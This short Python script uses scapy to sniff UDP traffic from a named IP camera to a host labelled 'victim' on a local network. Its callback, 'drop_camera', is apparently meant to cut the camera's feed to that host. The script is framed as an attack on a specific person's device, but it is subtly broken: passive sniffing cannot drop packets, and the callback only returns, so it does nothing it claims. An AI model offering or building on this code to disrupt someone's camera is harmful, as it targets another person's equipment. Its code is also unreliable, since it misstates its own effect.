from scapy.all import sniff, UDP, IP

IFACE = "en0"
IP_CAMERA = "192.168.0.81"
IP_VICTIM = "192.168.0.162"

def drop_camera(pkt):
    if UDP in pkt and pkt[IP].src == IP_CAMERA and pkt[IP].dst == IP_VICTIM:
        return

sniff(iface=IFACE,
      filter=f"udp and src {IP_CAMERA} and dst {IP_VICTIM}",
      prn=drop_camera)